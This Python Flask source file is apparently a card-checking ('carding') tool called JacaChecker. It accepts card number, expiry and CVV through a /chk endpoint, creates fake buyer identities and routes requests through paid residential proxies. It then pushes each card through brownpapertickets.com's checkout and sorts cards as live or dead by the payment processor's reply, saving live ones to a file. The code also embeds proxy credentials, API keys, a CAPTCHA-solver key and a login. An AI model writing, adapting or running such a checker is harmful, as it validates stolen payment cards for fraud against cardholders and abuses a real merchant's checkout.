import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

def criarTask():
    data = {
        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": "https://heralddispatch.newzware.com/ss70v2/gazette/common/template.jsp?remclear=Y",
            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    

    
    
    
def checker(card, month, year, cvv):
        
        
        

            
        try:
            
        

            #p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
            headers = {
                    'Host': 'randomuser.me',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://namso-gen.com',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://namso-gen.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                    }

            response = requests.get( url, headers=headers, verify=False)
            email = pegarItem(response.text, '"email":"','"')
            nome = pegarItem(response.text, '"first":"','"')
            sobrenome = pegarItem(response.text, '"last":"','"')
            street = pegarItem(response.text, '"name":"','"},"city"')
            snumber = pegarItem(response.text, '"street":{"number":',',')
            city = pegarItem(response.text, '"city":"','"')
            state = pegarItem(response.text, '"state":"','"')
            postcode = pegarItem(response.text, '"postcode":',',')
            company = pegarItem(response.text, '"username":"','"')
            tel = random.randint(00000,99999)
            
   
          

            
            if response.status_code == 200:
                
                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
                start_time = time.time() 

    
            # if len(year) == 4:
            #     year = year[2:]
 
 
 
            url = "https://www.brownpapertickets.com/index.html"
            payload = {}
            headers = {
            'Host': 'www.brownpapertickets.com',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.brownpapertickets.com/checkout.html',
            'Accept-Language': 'pt-PT,pt;q=0.9',
            #'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; client_secure="8nPuHrcJEZDRs7W"; _gat_UA-114148720-1=1; bpt="nAGY.nAGYgMDK-1712790582730"; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790582.24.0.0; _ga=GA1.1.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790582.0.0.0'
            }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)
            email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
            password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
            bpt = response.cookies.get('bpt')
            client_secure = response.headers.get('client_secure')
            print(bpt)



            url = "https://www.brownpapertickets.com/login.html"
            payload = f'{email_id}=suor_jose2daislv%40gmail.com&not_a_valid_field=Password&{password}=radask10'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/index.html',
                'Accept-Language': 'pt-PT,pt;q=0.9',
                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; _gat_UA-114148720-1=1; client_secure="CEZzL2De6JDbXn3"; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790394.38.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790400.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)
            
            
      


            url = "https://www.brownpapertickets.com/bulk/shippinginfo.html"
            payload = 'submitted=1&country=United%20States&shipping_type=p&fname=Jose&lname=Silva&address=23937%20Rancho%20Ct&city=Valencia&state=CA&province=&zip=91354&email=jacaccbot%40gmail.com&phone=6612147345'
            headers = {
            'Host': 'www.brownpapertickets.com',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'https://www.brownpapertickets.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.brownpapertickets.com/bulk/shippinginfo.html',
            'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gid=GA1.2.1366341742.1712632269; bpt="nAGY.nAGYSJ3h-1712849785279"; language="en_US"; locale="en_US"; _gat_UA-114148720-1=1; client_secure="3rCnMpnAPs2xiky"; _ga_J4R614QWT5=GS1.1.1712852197.15.1.1712853334.15.0.0; _ga=GA1.1.2130983608.1712348265; _derived_epik=dj0yJnU9cmdJRjcyelZKWVBzTW0xUjUycWZaamlKbTZRdTRrMkMmbj1kbWtUcVFyY1JCSDlpZ0pkUHRxTVZ3Jm09MSZ0PUFBQUFBR1lZRVZnJnJtPTEmcnQ9QUFBQUFHWVlFVmcmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712852197.15.1.1712853354.0.0.0',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)

    
 

 
            url = "https://www.brownpapertickets.com/bulk/billinginfo.html"
            payload = f'submitted=1&browserinfo=24.false.1080.1920&type=Visa&number={card}&month={month}&year={year}&code=789&fname=Jose&lname=Silva&address=23937%20Rancho%20Ct&city=Valencia&state=CA&province=&zip=91354&country=United%20States&terms=t'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/bulk/billinginfo.html',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gid=GA1.2.1366341742.1712632269; bpt="nAGY.nAGYSJ3h-1712849785279"; language="en_US"; locale="en_US"; client_secure="3rCnMpnAPs2xiky"; _ga_J4R614QWT5=GS1.1.1712852197.15.1.1712853356.60.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9Y3B0SERWbW43TWZMQVhUVmdPTXlMbEtfS1pwaHkwNWUmbj1UamJyX3dNRFNmQmUtSkV1dWM4VHR3Jm09MSZ0PUFBQUFBR1lZRVcwJnJtPTEmcnQ9QUFBQUFHWVlFVzAmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712852197.15.1.1712853376.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=200)

            
            if "Redirection" in response.text:
                raise RequisicaoException()
 
            
            elapsed_time = time.time() - start_time
            
            MSegundos = round(elapsed_time, 2) #[{MSegundos} Ms]


                
                    
            if 'Invalid transaction' in response.text:
                #code = response.json()['issuerResponseDetails']['issuerResponseCode']
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos} Ms]"                          
                open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos} Ms] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker")  
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                
            elif 'Insufficient funds' in response.text:
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos} Ms] "                          
                open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos} Ms] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker")  
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                

                    
            elif 'The error returned by the credit card processor was' in response.text:
                response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos} Ms]"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                        

            else:
            # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
                print(Fore.RED + 'Gateway Timeout' + [{MSegundos}] )
                return {"code": 1, "mensagem": f"Gateway Timeout [{MSegundos} Ms] #JacaChecker<br>"} 
                    

                        

                    
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except RequisicaoException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = checker(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

